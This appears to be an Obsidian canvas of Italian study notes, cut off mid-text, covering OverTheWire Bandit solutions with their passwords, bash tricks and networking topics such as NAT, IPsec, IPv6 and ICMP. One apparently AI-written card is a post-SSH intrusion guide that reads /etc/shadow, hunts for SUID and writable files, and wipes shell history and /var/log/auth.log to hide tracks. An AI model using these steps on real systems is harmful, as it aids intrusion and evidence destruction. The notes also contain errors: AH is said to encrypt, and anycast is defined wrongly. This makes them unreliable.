		{"id":"ea0a31adef225299","type":"text","text":"# Level 1, 2, 3, 4, 5\n\n1. Il file si chiama `-`, se provi a fare `cat -` ovviamente quello si aspetta che stai per scrivere un'opzione. Io ho risolto facendo `cp - /tmp/hello` (non avevo i permessi per scrivere altrove, `/tmp` è stato il best guess) e poi leggendo `cat /tmp/hello`.\n\n```\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx\n```\n\n2. La difficoltà sarebbe che il file contiene spazi. A parte che se scrivi `cat s` e poi fai `tab` ti scrive già tutto in automatico, ma in caso te lo scordi puoi mettere l'escape character (`\\ `) oppure il nome tra virgolette (`cat 'spaces in this filename'`).\n\n```\nMNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\n```\n\n3. I file nascosti si vedono con `ls -a`.\n\n```\n2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\n```\n\n4. Come prima, visto che i file cominciano con `-` tocca trovare un altro modo, tipo `cat ./-file00`. Non mi andava di controllarli uno per uno: sotto parliamo di ***script bash***.\n\n```\n4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\n```\n\n5. Qui il punto è: posso anche fare `for f in ./*; do ls -la ./$f; done | grep 1033`, e in effetti esce un unico file, il problema è che non mi dà il percorso (solo il nome!). Non so se ci sono modi per far stampare il percorso a `ls`, ma nel dubbio `du` lo fa già in modo nativo. Quindi `du -ab | grep 1033` (`-a` per stampare tutti i file e `-b` per le dimensioni in `byte`), restituisce `1033    ./maybehere07/.file2`, quindi `cat`. ***Oppure*** banalmente `find . -size 1033c`!! (non io che mi complico la vita).\n\n```\nHWasnPhtq9AVKe0dmk45nxy20cvUa6EG\n```","x":3257,"y":4809,"width":759,"height":859,"color":"4"},
		{"id":"4b0914af8d708d70","type":"text","text":"# **🕵️‍♂️ **\n\nHai appena stabilito una connessione **SSH** con una macchina remota. Il tuo obiettivo ora è **capire dove ti trovi**, **chi sei**, **cosa puoi fare** e **fino a che punto puoi spingerti**. Un hacker esperto deve ottenere **il massimo delle informazioni nel minimo tempo possibile**, quindi seguiamo un approccio **metodico ed efficiente**. 🚀\n\n---\n\n## **📍 1. Dove Mi Trovo? Identificare il Sistema**\n\nLa prima domanda da porsi è: **che macchina è questa?** Potresti essere su un server Linux, un container Docker, una macchina virtuale... e ogni situazione cambia le tue possibilità d’azione.\n\n🔹 **Controllare il sistema operativo e la distribuzione**\n\n```bash\nuname -a   # Versione del kernel e architettura\ncat /etc/os-release  # Nome della distribuzione Linux\ncat /proc/version  # Info dettagliate sul kernel\n```\n\n💡 **Se vedi qualcosa tipo `container` o `lxc` nel kernel, probabilmente sei in un container Docker o LXC!**\n\n🔹 **Dove sei nel filesystem?**\n\n```bash\npwd   # Mostra la tua directory corrente\nls -la  # Lista tutto, inclusi file nascosti\nmount | column -t  # Controlla i filesystem montati\n```\n\n💡 **Se sei in `/home/user` o `/tmp`, probabilmente sei un utente normale. Se sei in `/root`... jackpot!**\n\n---\n\n## **🆔 2. Chi Sono? Controllare i Permessi dell’Utente**\n\n```bash\nwhoami   # Nome dell’utente attuale\nid       # UID, GID e gruppi dell’utente\ngroups   # Quali gruppi sono associati al tuo utente\n```\n\n💡 **Se il tuo UID è `0`, sei root!** Se no, controlla se sei in gruppi **privilegiati** (`sudo`, `docker`, `adm`... questi possono aiutarti a scalare privilegi).\n\n🔹 **Chi è loggato sulla macchina?**\n\n```bash\nwho      # Lista degli utenti connessi\nw        # Chi è connesso e cosa sta facendo\nlast     # Storico degli accessi\n```\n\n💡 **Se vedi admin o root attivi, potresti aspettare che eseguano un comando con `sudo` e provare un attacco di hijacking.**\n\n🔹 **Sto usando un account di servizio o un utente reale?**\n\n```bash\ncat /etc/passwd | grep $(whoami)\n```\n\nSe vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.\n\n---\n\n## **🔎 3. Cosa Posso Fare? Capire i Privilegi**\n\n### **🔹 Ho accesso a `sudo`?**\n\n```bash\nsudo -l\n```\n\n💡 **Se puoi eseguire comandi senza password (`NOPASSWD`), potresti ottenere root facilmente!**\n\n### **🔹 Ci sono comandi con `SUID`?**\n\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\n💡 **Se trovi `/bin/bash` con il bit SUID attivo, puoi eseguire una shell con privilegi elevati!**\n\n---\n\n## **📂 4. Esplorare il Filesystem e i Dati Sensibili**\n\n### **🔹 File Importanti da Controllare**\n\n```bash\ncat /etc/passwd  # Lista degli utenti\ncat /etc/shadow  # Hash delle password (richiede root, ma puoi provare...)\ncat /etc/sudoers  # Configurazione sudo\nls -la /root/  # Vedi cosa c'è nella home di root (se puoi)\n```\n\n💡 **Se hai accesso a `/etc/shadow`, puoi tentare di craccare le password con John the Ripper o Hashcat.**\n\n### **🔹 File con permessi deboli**\n\n```bash\nfind / -type f -perm -o+w 2>/dev/null  # File scrivibili da chiunque\nfind / -type d -perm -o+w 2>/dev/null  # Directory scrivibili da chiunque\n```\n\n💡 **Se un file di configurazione critico è scrivibile da te, potresti modificarlo per ottenere accesso elevato!**\n\n---\n\n## **📡 5. Controllare la Rete e il Contesto**\n\nSe sei entrato via **SSH**, probabilmente il sistema è **parte di una rete più grande**. Potresti cercare altre macchine vulnerabili da attaccare.\n\n🔹 **Quali interfacce di rete ci sono?**\n\n```bash\nip a\n```\n\n💡 **Se vedi un IP privato (`192.168.x.x`, `10.x.x.x`), potresti essere in una rete interna con altre macchine interessanti!**\n\n🔹 **Quali connessioni sono attive?**\n\n```bash\nnetstat -tulnp  # Mostra porte aperte e processi associati\nss -tulnp       # Alternativa più moderna a netstat\n```\n\n💡 **Se vedi servizi con porte aperte, potresti attaccarli per espandere il tuo accesso.**\n\n🔹 **Quali processi stanno girando?**\n\n```bash\nps aux --sort=-%mem  # Processi ordinati per uso memoria\nps aux --sort=-%cpu  # Processi ordinati per uso CPU\n```\n\n💡 **Se vedi un servizio con privilegi elevati, potresti provare un attacco tramite privilege escalation.**\n\n---\n\n## **🎭 6. Rimanere Invisibili**\n\nSe sei entrato in un sistema e vuoi **minimizzare le tracce**, ci sono alcune tecniche per coprire il tuo ingresso.\n\n🔹 **Pulire la cronologia della shell**\n\n```bash\nhistory -c && history -w\n```\n\n🔹 **Disabilitare la cronologia temporaneamente**\n\n```bash\nunset HISTFILE\nexport HISTSIZE=0\nexport HISTFILESIZE=0\n```\n\n🔹 **Eliminare i log SSH**\n\n```bash\n> ~/.bash_history\necho \"\" > /var/log/auth.log  # Richiede privilegi elevati\n```\n\n💡 **Tieni a mente:** Se sei in un ambiente monitorato, potrebbero comunque accorgersi di movimenti sospetti.\n\n---\n\n## **🚀 Conclusione: La Prima Mossa È Capire il Campo di Battaglia**\n\nOra sai **come raccogliere rapidamente informazioni su un sistema** una volta dentro via SSH.\n\n✅ **Dove sei?** Controlla il sistema operativo, il filesystem e la rete.  \n✅ **Chi sei?** Determina i tuoi privilegi e i gruppi a cui appartieni.  \n✅ **Cosa puoi fare?** Scansiona permessi, file sensibili, processi e accessi di rete.  \n✅ **Come coprirti?** Ripulisci tracce, disabilita log e cronologia.\n\n🔎 **Vuoi ora esplorare le tecniche di privilege escalation per ottenere root?** 😈","x":3257,"y":7676,"width":759,"height":935},
		{"id":"acec287a5d504ba6","type":"text","text":"💡 **Trucco da hacker:** Puoi usare `pushd` e `popd` per **salvare e ripristinare rapidamente** la tua posizione.\n\n```bash\npushd /etc  # Salva la posizione corrente e vai in /etc\npopd        # Torna alla directory precedente\n```\n\n### **🔎 `which`, `whereis`, `type` - Trovare comandi**\n\n```bash\nwhich ls  # Percorso del comando 'ls'\nwhereis ls  # Mostra anche il manuale e i binari collegati\ntype ls  # Dice se è un comando built-in o esterno\n```\n\n💡 **Perché `cd` non ha un percorso?** Perché è un comando **interno** alla shell!\n\n---\n\n## **📜 5. Leggere File Importanti del Sistema**\n\n### **🛠 File fondamentali in `/etc`**\n\n- `/etc/passwd` → Utenti del sistema\n- `/etc/shadow` → Password criptate degli utenti\n- `/etc/hosts` → Mappatura IP ↔ Hostname\n- `/etc/fstab` → File system montati all'avvio\n\n```bash\ncat /etc/passwd  # Mostra utenti\ncat /etc/shadow  # Richiede permessi di root (password criptate)\ncat /etc/hosts  # Controlla domini personalizzati\n```\n\n---\n\n## **💣 6. Tecniche Avanzate e Trucchi da Hacker**\n\n🔹 **Montare filesystem manualmente**\n\n```bash\nmount /dev/sdb1 /mnt  # Monta una partizione\numount /mnt  # Smonta la partizione\n```\n\n💡 **Utile se trovi un disco USB e vuoi esplorarne il contenuto senza autorun.**\n\n🔹 **Controllare i processi e il filesystem in `/proc`**\n\n```bash\nls -l /proc/[PID]  # Esplora i dettagli di un processo specifico\ncat /proc/mounts  # Vedi i filesystem montati\n```\n\n💡 **Il `/proc` non è un filesystem reale, ma un’interfaccia per il kernel!**\n","x":2257,"y":7676,"width":759,"height":935},
		{"id":"c61155df72f8f47a","type":"text","text":"# Expansions & History\n\n\nSalto le cose che so e ne scrivo due che non sapevo.\n\n- ***Expansions*** - `Bash` ti consente di creare shortcut per varie cose:\n\t- ***Brace Expansion*** - Tratta il contenuto di parentesi graffe `{}` come una lista:\n\t\t- `file{1,2,3}.txt` $\\to$ `file1.txt file2.txt file3.txt`;\n\t\t- `{a..f}` $\\to$ `a b c d e f`;\n\t\t- `{001..005}` $\\to$ `001 002 003 004 005`;\n\t\t- `{a..z..2}` $\\to$ `a c e g i ...` (espande con passo `2`);\n\t\t- `{A,B}{1,2,3}` $\\to$ `{A1 A2 A3 B1 B2 B3}` (fa il prodotto cartesiano).\n\t- ***Tilde Expansion*** - Quando `Bash` vede `~` lo espande nella `home directory` dell'utente corrente;\n\t- ***Parameter Expansion*** - Espande le variabili, e.g. `$HOME` $\\to$ `/home/user`;\n\t\t- Si possono mettere dentro robe condizionali\n\t- ***Command Substitution*** - `$(comando)` esegue il `comando` ed usa il suo output (si può fare anche con le `backtick`); \n\t- ***Arithmetic Expansion*** - `$((algebra))` esegue l'`algebra` ed usa il suo output;\n\t- ***Word Splitting*** - Dato `LIST=\"1 2 3\"`, ci sono due comportamenti di default:\n\t\t- `$LIST` splitta l'output, ovvero `1`, `2` e `3` sono entità separate;\n\t\t- `\"$LIST\"` conserva la struttura non splittata di stringa.\n\t- ***Pathname Expansion*** - Nell'indicare il nome di un file, posso usare `*` per indicare qualsiasi numero di qualsiasi caratteri, `?` per intendere un carattere qualsiasi, `[abc]` (***wildcard expansion***) per indicare una qualsiasi tra le lettere `a`, `b` e `c` e `{a,b,c}` (come in precedenza) per indicarle tutte.\n- ***History*** - `Bash` tiene traccia di quello che fai, ma oltre ad andare su e giù tra i comandi con le frecce puoi fare molto di più:\n\t- `history` visualizza tutti i comandi eseguiti, numerandoli riga per riga;\n\t- `!!` ripete l'ultimo comando eseguito;\n\t- `!n` esegue il comando `n` nella lista di `history`;\n\t- `!ssh` esegue l'ultimo comando nella `history` che inizia per `ssh`;\n\t- Se sbaglio a scrivere un comando, posso correggerlo con `^errore^correzione`;\n\t- `!$` espande l'argomento del precedente comando (e.g. `mkdir mydir; cd !$`).","x":-2797,"y":4790,"width":759,"height":894,"color":"4"},
		{"id":"430d8b04ba92b85a","type":"text","text":"# Espansioni Condizionali  e di Comandi \n\nNota che le graffe possono essere usate anche per ***espandere i comandi***. Se ad esempio vuoi eseguire `comando 2` ***e*** `comando 3` sse fallisce `comando 1` devi scrivere\n```bash\ncomando 1 || { comando 2 && comando 3; }\n```\n\nNota anche gli spazi tra le graffe e i comandi, altrimenti `bash` si arrabbia.\n","x":-2797,"y":5899,"width":759,"height":246,"color":"4"},
		{"id":"279048b2ffd901e7","type":"text","text":"\n| Sintassi          | Descrizione                                                           |\n| ----------------- | --------------------------------------------------------------------- |\n| `${VAR:-default}` | Se `VAR` è vuota o non esiste, usa `\"default\"` **ma non la assegna**. |\n| `${VAR:=default}` | Se `VAR` è vuota o non esiste, le assegna `\"default\"`.                |\n|                   |                                                                       |\n\n\n```bash\necho ${USER:-guest}   # Se USER non esiste, stampa \"guest\"\necho ${HOME:=/tmp}    # Se HOME non è settata, la assegna a \"/tmp\"\n```\n\n---\n\n| Sintassi                              | Descrizione                                 |\n| ------------------------------------- | ------------------------------------------- |\n| `${VAR:?Errore, VAR non è impostata}` | Se `VAR` non esiste, stampa errore ed esce. |\n|                                       |                                             |\n```bash\necho ${CONFIG_PATH:?Errore, variabile non settata!}\n```\n\nSe `CONFIG_PATH` è vuota, Bash stamperà\n\n```bash\nbash: CONFIG_PATH: Errore, variabile non settata!\n```\n\nUtile per script che richiedono variabili obbligatorie.\n\n---\n\n### Substringing e Sostituzioni Avanzate\n\n|Sintassi|Descrizione|\n|---|---|\n|`${VAR:0:5}`|Estrae una sottostringa: primi `5` caratteri.|\n|`${VAR//o/X}`|Sostituisce **tutti** gli \"o\" con \"X\".|\n|`${VAR/#Hello/Hi}`|Sostituisce `\"Hello\"` **all'inizio** con `\"Hi\"`.|\n|`${VAR/%World/Everyone}`|Sostituisce `\"World\"` **alla fine** con `\"Everyone\"`.|\n\n```bash\nVAR=\"HelloWorld\"\n\necho ${VAR:0:5}    # → \"Hello\"\necho ${VAR//o/X}   # → \"HellXWXrld\"\necho ${VAR/#Hello/Hi}  # → \"HiWorld\"\necho ${VAR/%World/Everyone}  # → \"HelloEveryone\"\n```","x":-2797,"y":6262,"width":759,"height":856},
		{"id":"6c0d3669627386fe","type":"text","text":"# Comandi `fc` (`fix command`) & `history`\n\nCome detto, la `shell` ha una memoria temporanea di quello che fai e ti permette di giocare con i comandi che hai già eseguito. Questo include modificarli e cancellarli.\n\nIl comando `history` ti fa accedere alla lista di comandi eseguiti, ma può fare molto di più:\n\n- `-N` - Mostra gli ultimi `N` comandi\n- `-d N` - Cancella il comando `N` dalla memoria temporanea;\n\t- \"Perché continui a dire temporanea? La mia shell si ricorda quello che faccio tra una sessione e l'altra!\". Sì, ma solo perché quando la chiudi copia la sua memoria volatile su `~/.bash_history`. Infatti se apri multiple `shell` avrai notato che la volta dopo molti comandi sembrano svaniti, perché ***solo l'ultima `shell` che chiudi scrive sul file di log della history***.\n- `-c` - Cancella tutta la memoria temporanea;\n- `-w` - Scrive la `history` attuale sul file `~/.bash_history` (simile a `-r`, `reload`);\n\nMa oltre a cancellare quello che ho fatto posso anche correggerlo? Sì. `fc` (`fix command`) serve per ***modificare e rieseguire*** comandi precedenti della `history`. Questo comando è molto potente, da usare con cautela.\n\n- `fc 100` - Apre i comandi dalla `history` da `100` a `103` NO FALSO NON HO CAPITO COME FUNZIONA\n- `-l` Elenca i comandi, **senza eseguirli** e **senza aprire l’editor**.\n- `-n` - Usata con `-l`: **non stampa i numeri** della history.\n- `-r` - Inverte l’ordine dell’elenco (utile con `-l`).\n- `-e editor` - Specifica quale editor usare, es: `fc -e nano`.","x":-3723,"y":4790,"width":759,"height":894,"color":"3"},
		{"id":"00e1134b8cb7260f","type":"text","text":"# Varie Comandi\n\n\nCambiare il font dei terminali:\n\n- `nano ~/.Xresources` e aggiungi\n\t- `xterm*faceName: Monospace`\n\t- `xterm*faceSize: 12`\n\t- `/home/user/.Xresources (END)`\n- Salva, poi su terminale `xrdb -merge ~/.Xresources`.\n\n\n\n\n\nper riprendere l'esecuzione di un processo stoppato (CTRL+Z):\n\n- `fg` - torna ad essere eseguito in foreground (attivo nel terminale);\n- `bg` - torna ad essere eseguito in background.\n\t- ha lo stesso effetto di `&` a fine comando\n","x":-10579,"y":6565,"width":759,"height":410},
		{"id":"39fe9d808700246c","type":"text","text":"# Il NAPT è un layer di Sicurezza?\n\nIn breve, sì. Passare attraverso (= \"**bucare**\") il NAPT (***NAT Traversal***) non è banale.\n\n- Specificare una porta con una direttiva di ***NAPT Statico*** (anche detto ***Full Cone NAT***) permette di ignorare tutte le altre (e.g. se specifico `192.168.1.1 10` -> `200.1.1.1 30` tutti i pacchetti indirizzati a `200.1.1.1` ma con `porta`$\\neq$ `30` verranno cestinati). In pratica, posso fare *NAT Traversal* solo sapendo quale porta è aperta. Questa *feature* prende il nome di ***port forwarding*** (o ***port mapping***);\n\t- Posso invece passare attraverso il *NAT Statico* con *qualsiasi* `porta`, se conosco l'`IP`;\n- Se uso ***NAPT Dinamico***, stabilire una connessione con un host non è banale perché neanche l'host stesso conosce il suo indirizzo pubblico. A meno che, naturalmente, non sia lui ad aprirla. C'è una giungla di tecniche per provare a \"bucare\" il NAPT (**UDP Hole Punching**, **UPnP**, **MAT-PMP**, ...), che però devono (credo) sempre sfruttare un server di segnalazione (e.g. **STUN**).\n\t- Il NAPT Dinamico è anche detto ***NAPT Simmetrico*** (usa una nuova `Porta_NAT` per ogni combinazione `IP_Host Porta_Host`, anche se `IP_Destinazione` è lo stesso);\n\t- Esiste anche il ***NAPT Asimmetrico***, che usa una `Porta_NAT` per ogni `IP_Host` indipendentemente dalla `Porta_Host` e gestisce fino a $2^{16}$ dispositivi. Utile in applicazioni P2P e giochi. Dato che randomizza meno le porte è un po' più facile da bucare, motivo per cui si usa sempre meno.\n\nIn pratica, il layer di sicurezza dato dal NAPT si riassume così: se l'host dietro NAPT non ha creato una connessione con il computer target, i pacchetti a lui diretti vengono scartati.\n\nLa grossa falla di questo sistema è che il router è l'unico ***failure point***: se un malintenzionato riesce ad entrarci dentro può potenzialmente compromettere la sicurezza di tutti i dispositivi sulla rete locale dietro quel router.\n\nContro questo rischio ci sono due \"argini\":\n\n- Possono esistere più livelli di NAPT annidati. Il singolo router non è più l'unico *point of failure* per tutta la rete, ma solo della sua LAN;\n- Meccanismi di difesa implementati dagli admin di Rete.","x":-17473,"y":4240,"width":790,"height":848,"color":"#4545ff"},
		{"id":"5e078390c80df780","type":"file","file":"0 - Reti di Elaboratori/NAT_Disambigua.png","x":-16453,"y":4454,"width":780,"height":421},
		{"id":"7a683155fe19cadc","type":"text","text":"# Quindi cosa devo usare?\n\nDipende da cosa devi fare. Se devi creare una singola connessione che parte dall'interno della LAN non ci sono problemi.\n\n|                                                                                                                     | NAT Statico | NAT Dinamico | PAT Statico                  | PAT Dinamico                 |\n| ------------------------------------------------------------------------------------------------------------------- | ----------- | ------------ | ---------------------------- | ---------------------------- |\n| Assegna l'IP in modo deterministico?                                                                                | Sì          | No           | Sì                           | Dipende dalla configurazione |\n| Posso avviare la comunicazione dall'esterno (i.e. ha senso metterci dietro un server)?                              | Sì          | No           | Sì                           | No                           |\n| Una volta che fuori conoscono il mio IP, posso creare facilmente una connessione a doppio canale (e.g. Active FTP)? | Sì          | Sì           | Va scritto in modo esplicito | No                           |\n| Protegge bene da un *NAT Traversal*?                                                                                | No          | Circa        | No                           | Sì                           |\n\nTutte queste decisioni vengono prese guardando soltanto l'`IP_Sorgente`. Posso prendere decisioni anche a seconda dell'`IP_Destinazione` (***Policy NAT***).\n```\nif source 192.168.1/24 and destination 100.1.1.1\n\t192.168.1/24 > 200.1.1.1\n\nif source 192.168.1/24\n\t192.168.1/24 > 200.1.1.5\n```\nInoltre posso tradurre anche la destinazione (***Twice NAT***). Se ad esempio cerco un server DNS, il router aziendale può reindirizzarmi da `8.8.8.8` (check sulla destinazione, quindi usando *Policy NAT*) al proprio server DNS (e.g. `static NAT destination to 80.80.80.80`).","x":-16453,"y":5217,"width":780,"height":815,"color":"4"},
		{"id":"a0722c7f81126360","type":"text","text":"# DNS Dinamico\nSvantaggi: se apro un server non ho modo di comunicare il mio IP al mondo. Come si risolve? DNS dinamico.","x":-15435,"y":5472,"width":349,"height":305},
		{"id":"8d45a43704e34f6f","type":"text","text":"# Tipi di NAT e Port Address Translation (PAT)\n\nIn realtà questa descrizione di NAT è un po' superficiale e serve solo a capire il meccanismo generale. Il NAT è la traduzione degli indirizzi IP privati in pubblici, non delle porte.\n\n- Un ***NAT Statico*** mappa *one-to-one* gli `IP_Host` agli `IP_NAT` disponibili tramite delle direttive *hard-coded* dall'admin di rete (e.g. `192.168.1.165` -> `200.1.1.1`). In questo caso, ogni assegnazione viene dichiarata esplicitamente;\n- Un ***NAT Dinamico*** fa la stessa cosa, ma in modo più flessibile. Una direttiva può essere `192.168.1.0\\24 will share 200.1.1.1 through 200.1.1.5`, ovvero \"quando un host `192.168.1.xxx` manda una richiesta per Internet, assegnagli un indirizzo casuale tra quelli disponibili nel range \\[`200.1.1.1`, `200.1.1.5`\\]\".\n\nIn entrambi i casi, il numero di `Host` che si possono collegare dietro NAT è limitato dal numero di indirizzi `IP_NAT` disponibili, perché il **NAT opera solo a livello di Rete**. Mappare diversi `IP_Host` in uno stesso `IP_NAT` pubblico (***IP*** (o ***NAT***) ***Overloading***) è possibile solo se si usano le porte per demultiplexare. Questo significa usare anche un ***Port Address Translation*** (***PAT***). Usare insieme *NAT* e *PAT* è a rigore indicato come ***NAPT***, ma dato che cambiare solamente la porta è una pratica abbastanza inusuale si usa semplicemente **PAT come sinonimo di NAPT.** Poi in pratica la gente è ignorante e usa *NAT* per indicare tutto. Dal momento che questa tecnica permette di nascondere l'`IP_Host` è anche nota come ***IP Masquerading***. Anche qui distinguo\n\n- ***PAT Statico*** - Sostituisce sempre una certa coppia `IP_Host Porta_Host` con la stessa coppia `IP_PAT Porta_PAT` (e.g. `192.168.1.165 8080` -> `200.1.1.1 80`). Questo consente di rendere un ***server*** disponibile dall'esterno sempre sulla stessa coppia `IP Porta`;\n\t- Cambiare la porta permette al server di ascoltare su porte non-standard (e.g. ascolto `HTTP` sulla `Porta_Server = 8080`, ma traduco in `Porta_PAT = 80`. Le richieste client da browser vanno in automatico sulla `Porta 80`, il *PAT* me le reindirizza su `8080`);\n- ***PAT Dinamico*** - Fa la stessa cosa, ma la `Porta_PAT` è scelta in modo casuale tra quelle disponibili. Il comportamento esatto è quello del riquadro a fianco.\n","x":-17473,"y":5217,"width":790,"height":815,"color":"4"},
		{"id":"bbd22089bc42007f","type":"text","text":"# IP Sec e VPN\n\nLayer di sicurezza direttamente su IP. Può agire in due modi:\n\n- ***Authentication Header Protocol*** (***AH***) - Cifra il payload del datagramma. Questo porta problemi con i NAT, che controllano l'integrità del messaggio con una funzione di hash (la modifica del solo payload rompe il digest). Poco usato;\n- ***Encapsulation Security Protocol*** (***ESP***) - Detta ***modalità tunnel*** o più comunemente ***Virtual Private Network*** (***VPN***). Cifra l'intero datagramma e lo incapsula in un altro, sostituendo le vere informazioni end-to-end tra gli host con quelle end-to-end dei router della VPN. Solo a destinazione il datagramma originale viene riesumato, motivo per cui chi legge il traffico non vede l'IP dell'host che lo ha inviato, ma solo quello del router VPN.\n\nQuando si parla di IPsec ci si riferisce in pratica alla seconda modalità d'uso.\n\nSi può intuire che mentre IP è stateless ***IPsec crea una connessione***. Quando ciò avviene, il router di partenza $R_1$ invia al router di arrivo $R_2$ un set di ***Security Associations*** (***SAs***), che include chiavi si sessione e quant'altro. Una sorta di handshaking unidirezionale, i cui risultati vengono salvati in due distinti DB:\n\n- ***Security Policy Database*** (***SPD***) - Contiene le informazioni relative a quando e se usare IPsec, nonché quale SA usare. In pratica **sa cosa fare**;\n- ***Security Association Database*** (***SAD***) - Contiene le informazioni relative alle varie SAs, su come trattare i datagrammi in uscita e quelli in ingresso. In pratica **sa come farlo**.\n\nA questo punto aggiunge del padding in coda al datagramma originale (per evitare attacchi di tipo ***deep packet inspection***, in cui deduco informazioni sul messaggio dalla sua lunghezza) e cifra il tutto con la chiave simmetrica.\n\nAggiunge quindi header ESP che specifica l'ID del tunnel e il numero di sequenza del pacchetto. Questo, insieme al MAC aggiunto in coda, evita gli attacchi replay: ricevere un duplicato farà cadere la connessione.\n\nInfine, aggiunge il nuovo header IP e invia il datagramma.\n\nQualunque agente esterno tra $R_1$ ed $R_2$ non può fare assolutamente niente rispetto al messaggio originale (se non eventualmente far cadere la connessione).","x":-16453,"y":6106,"width":780,"height":991,"color":"#4545ff"},
		{"id":"48960e7373f05723","type":"text","text":"# Indirizzi IPv6\n\nNon ci sono più IPv4 disponibili? La soluzione non è il NAT, ma creare un nuovo formato di indirizzi a $128\\,bit$. Questo permette di identificare *ogni oggetto* su internet (e.g. una pagina web ha indirizzo fisso). O almeno, questa è la teoria. In pratica IPv6 è lontano dall'adozione globale.\n\nPerò è molto bello, si focalizza sull'essere snello e veloce.\n\n- L'header ha lunghezza fissa, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- Niente frammentazione (se un pacchetto supera l'MTU viene scartato!). Questo richiede di esplorare il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ICMP;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast***, ovvero la consegna a tutti gli host facenti parte di un gruppo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad IPv4.\n\nil problema è che quasi tutti i router sono ancora IPv4. Per trasmettere un IPv6 devo spesso Incapsularlo come payload dell'IPv4 (***tunneling***).\n\nAttualmente non funziona bene, ma in futuro si può cambiare il concetto di cosa rappresenta un indirizzo: può diventare direttamente un URI di ogni oggetto che metto online (piuttosto che una destinazione!). Ovvero, è un hash che identifica l'oggetto.\n\n\"IPFS (Interplanetary Filesystem), molto carino per applicazioni p2p.\"","x":-17473,"y":6106,"width":790,"height":691,"color":"4"},
		{"id":"5b890feef7056429","type":"file","file":"0 - Reti di Elaboratori/ReteMistaIPv4IPv6.png","x":-17473,"y":6865,"width":789,"height":232},
		{"id":"4f8240ee05d14bd3","type":"text","text":"# Come comunicano i Router? (ICMP)\n\nCome faccio a sapere se un router è online? Se il `TTL` è scaduto? Come stimo *RTT*?\n\nPer tutte queste domande (e molto altro) esiste un simpatico e snello protocollo che viaggia direttamente come *payload* di IP. Serve tendenzialmente a comunicare tra il router e chi gli ha mandato il pacchetto.\n\nConsta di $4\\,byte$ più eventuali dati, così suddivisi:\n\n- ***Tipo*** - i primi $8\\,bit$ sono dedicati alla tipologia di messaggio, ad esempio\n\t- $0$ - Risposta *echo* (\"`ci sono!`\");\n\t- $3$ - Destinazione Irraggiungibile;\n\t- $8$ - Richiesta *echo* (\"`ci sei?`\");\n\t- $30$ - Dedicato a Traceroute;\n- ***Codice*** - i successivi $8\\,bit$ specificano l'informazione del Tipo. Per la maggior parte dei Tipi esiste solo il codice $0$, ma ad esempio per il Tipo $3$ abbiamo codici\n\t- $0$ - Rete non raggiungibile\n\t- $1$ - Host non raggiungibile\n\t- $3$ - Porta di destinazione non raggiungibile (\"su questa porta non c'è alcun servizio\");\n\t- $7$ - Host di destinazione sconosciuto;\n- Gli ultimi $16\\,bit$ sono un checksum.\n\n***Traceroute*** è un abuso di ICMP: si invia una sequenza di datagrammi UDP con un numero di porta tipicamente non usato per UDP. Prima mando `TTL = 1`, il primo router lo scarta e risponde ICMP, il che include l'IP del router che l'ha scartato. Poi `TTL = 2`, e così via. Quando arrivo a destinazione, il server non ha un servizio attivo su quella porta, quindi ricevo un \"porta irraggiungibile\" e so di aver finito. Così trovo la gente anche se non accetta i ping. I router possono anche decidere di non rispondere: non sto mandando ping, sono loro che decidono di rispondere al fatto che un pacchetto è stato scartato.\n\n\n\nEsiste, un po' diverso, anche a livello di IPv6. È utile perché non essendoci frammentazione mi interessa trovare l'MTU minimo del percorso, e lo faccio tramite un algoritmo che sfrutta ICMPv6 (***PathMTUDiscovery***).","x":-17463,"y":7233,"width":780,"height":983,"color":"4"},
		{"id":"084ffa6fa8076d38","type":"text","text":"# Varie IP\n\nAll'interno della sottorete è previsto che tutti comunichino con tutti\n\nUn singolo dispositivo fisico ha tanti IP quante sono le sue interfacce. I router ne hanno $N$, gli host tipicamente due (Ethernet, Wi-Fi).\n\nnetfilter, VoIP, DMZ. p4.org","x":-19655,"y":5217,"width":814,"height":229},
		{"id":"9314d10e8c398b40","type":"text","text":"# Network Address Translation (NAT) - Overview\n\nIpotizziamo che il mio ISP mi fornisca un solo indirizzo IP. Sono costretto a poter collegare un solo host alla rete globale? No, assegno questo IP al router e poi sulla mia subnet locale uso gli ***indirizzi privati***. A quel punto sta al router reindirizzare il traffico ai vari host collegati.\n\nPer poter fare questo, il router deve disporre di un software in grado di eseguire la ***Network Address Translation*** (***NAT***). Come funziona?\n\n- Sono un host, e sulla rete locale ho indirizzo privato `192.168.1.165`. Voglio aprire una connessione TCP con il server `100.1.1.1` tra la mia porta `300` e la sua porta `443`. Creo il mio socket e invio il pacchetto al mio router che usa il NAT;\n- Il router non può mandare in rete un pacchetto con indirizzo `192.168.xxx.xxx`, perché è un indirizzo privato.\n\t- Se tutti facessero così, si romperebbe l'univocità degli IP. Esistono $N >> 1$ host che hanno indirizzo `192.168.1.165` sulla LAN, a chi mai dovrebbe essere consegnata la risposta?\n\t- In barba al concetto di *privato*, gli indirizzi IPv4 sono talmente pochi che ormai `192.168.1.165` esiste anche come indirizzo pubblico di rete. \"Del maiale non si butta niente\", diceva nonna IPv4.\n- Ma il router ha almeno un indirizzo IP pubblico assegnatogli dall'ISP (diciamo `200.1.1.1`), quindi può legittimamente mandare il pacchetto a nome suo. Allora sostituisce le informazioni del vero mittente con le proprie. `192.168.1.165 300` diventa `200.1.1.1 31`;\n\t- Perché cambiare anche la porta? Metti che anche `192.168.1.100` vuole aprire una connessione sulla porta `300`. Possono mai diventare entrambi `200.1.1.1 300`? E poi quando arriva la risposta come li distinguo? $\\Rightarrow$ La porta serve a **demultiplexare**;\n\t- Si potrebbe obiettare (e si sa che la gente obietta appena può) che essendo il router un dispositivo di Rete non dovrebbe cambiare gli header di Trasporto. Ma il router non lo sa e la cambia lo stesso;\n\t- Dato che uso la porta per demultiplexare, posso gestire fino a $2^{16}$ connessioni.\n- Le informazioni di demultiplexing (`192.168.1.165 